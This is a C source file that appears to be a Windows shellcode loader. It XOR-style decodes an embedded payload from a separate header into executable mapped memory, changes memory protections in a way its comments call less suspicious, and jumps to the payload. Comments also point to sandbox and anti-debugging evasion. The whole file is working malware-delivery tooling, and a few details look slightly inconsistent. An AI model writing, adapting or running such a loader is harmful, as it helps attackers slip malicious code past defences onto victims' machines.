#include <windows.h>
#include <stdio.h>

// include user32, weird windows linking
#pragma comment(lib,"user32.lib")

typedef struct {
	int  enc_length;
	int  length;
	char key[16]; // 8 byte XoR
	char payload[DATA_SIZE];
} phear;

// include the payload stored separately
#include "payload.h"

int _PARSER_START_CODE_LOADER = 0x7F4D4146;

void run(void * buffer, int payload_size) {
   void (*function)(char*);
   function = (void (*)(char*))buffer;
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE | SEC_COMMIT, 0, payload_size*2, NULL);
   if (hFile == NULL) {
      printf("CreateFileMapping failed\n");
      return;
   }

   char* ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   if (ptr == NULL) {
      printf("MapViewOfFile failed\n");
      return;
   }

   CloseHandle(hFile);

   printf("Running in 1s\n");
   Sleep(1000);

   // jump to entrypoint, should never come back to here
   function(ptr);
}

void spawn(void * buffer, int length, char * key) {
   void * ptr = NULL;

   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);

   // decode payload using sub-byte mapping (sub-byte of size 4)
   // TODO could probably parameterize the size of the sub-byte mapping
   for (int x = 0; x < length; x++) {
      unsigned char first = *((char *)buffer + x*2);
      unsigned char second = *((char *)buffer + x*2 + 1);
      for (int i = 0; i < 16; i++) {
         if (key[i] == first) {
            first = i;
         }
         if (key[i] == second) {
            second = i;
         }
      }
      *((char *)ptr + x) = (first << 4) | second;
   }

   // fix memory protection
   DWORD old;
   // obfuscation to readonly and then read/execute, less suspicious
   VirtualProtect(ptr, length, PAGE_READONLY, &old);
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);

   // run in this thread, have more memory trust
   run(ptr, length);
}

int main(int argc, char * argv[]) {
	// here could verify if we are not in a sandbox
	// or check for other anti-debugging tricks

	// data buffer modified by the python script
	phear * payload = (phear *) data;
	spawn(payload->payload, payload->length, payload->key);

	// should be unreachable, payload should run forever
	// sleep forever
	while (TRUE)
		WaitForSingleObject(GetCurrentProcess(), 10000);

	return 0;
}